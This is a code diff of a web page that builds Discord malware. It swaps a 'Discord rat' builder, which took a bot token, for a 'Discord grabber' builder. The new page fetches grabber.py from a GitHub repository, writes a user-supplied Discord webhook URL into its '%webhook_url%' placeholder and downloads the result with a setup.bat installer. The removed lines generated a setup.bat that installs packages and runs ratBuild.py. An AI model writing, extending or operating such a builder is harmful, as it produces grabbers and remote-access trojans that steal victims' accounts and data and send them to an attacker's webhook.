@@ -3,21 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Rat</title>
+    <title>Discord grabber</title>
 </head>
 <body>
     
-        <h1><u>Discord rat file</u></h1>
-        <textarea name="" id="botTokenText" placeholder="Bot Token (admin rights)" rows="5" cols="40"></textarea><br>
+    
+        <h1><u>Discord grabber file</u></h1>
+
+        <textarea name="" id="webhookUrlText" placeholder="webhook url" rows="5" cols="40"></textarea><br>
         <br>
-        <input type="button" value="Build file" onclick="getRatFile(document.getElementById('botTokenText').value)"><br>
+        <input type="button" value="Build file" onclick="getGrabberFile(document.getElementById('webhookUrlText').value)"><br>
         <br>
         <input type="button" value="Download setup.bat file" onclick="document.getElementById('downloadSetupFile').click()"><br>
         <br>
         <a href="../discord-tools.html">Back</a>
-        <a href="../files/setup-ratTool.bat" download id="downloadSetupFile"></a>
+        <a href="../files/setup-grabberTool.bat" download id="downloadSetupFile"></a>
     </div>
-
 </body>
 </html>
 <style>
@@ -46,19 +47,18 @@
     }
 </style>
 <script>
-    async function getRatFile(botToken) {
-        if(botToken) {
-
+    async function getGrabberFile(webhookUrl) {
+        if(webhookUrl.startsWith("https://discord.com/api/webhooks")) {
             try {
                 // URL der Datei auf GitHub
-                const url = 'https://raw.githubusercontent.com/Paloox/discordRatFile/main/rat.py';
+                const url = 'https://raw.githubusercontent.com/Paloox/discordGrabberFile/main/grabber.py';
                 // Datei von GitHub abrufen
                 const response = await fetch(url);
                 if (!response.ok) throw new Error('Network response was not ok');
                 let text = await response.text();
                 // Wort ersetzen
-                const originalWord = 'BOT_TOKEN';
-                const newWord = botToken;
+                const originalWord = '%webhook_url%';
+                const newWord = webhookUrl;
                 const modifiedText = text.replace(new RegExp(originalWord, 'g'), newWord);
                 // Blob-Datei erstellen
                 const blob = new Blob([modifiedText], { type: 'text/plain' });
@@ -66,7 +66,7 @@
                 // Download-Link erstellen
                 let a = document.createElement('a');
                 a.href = urlBlob;
-                a.download = 'discordRat.py';
+                a.download = 'discordGrabber.py';
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
@@ -78,23 +78,7 @@
                 console.error('Error fetching or modifying the file:', error);
             }
         } else {
-            alert("Wrong Bot Token");
+            alert("Wrong Discord Webhook!");
         }
-    }
-
-    function downloadRatSetupFile() {
-        const setupFileContent = ':: Made by https://github.com/Paloox\n:: You have a question? add me on discord: p4u1_\n@echo off\npython -m pip install requests colorama pystyle pywin32\npython ratBuild.py';
-        const blob1 = new Blob([setupFileContent], { type: 'text/plain' });
-        const urlBlob1 = URL.createObjectURL(blob1);
-
-        const a = document.createElement('a');
-        a.href = urlBlob1;
-        a.download = 'setup.bat';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-
-        // URL wieder freigeben
-        URL.revokeObjectURL(urlBlob1);
     }
 </script>
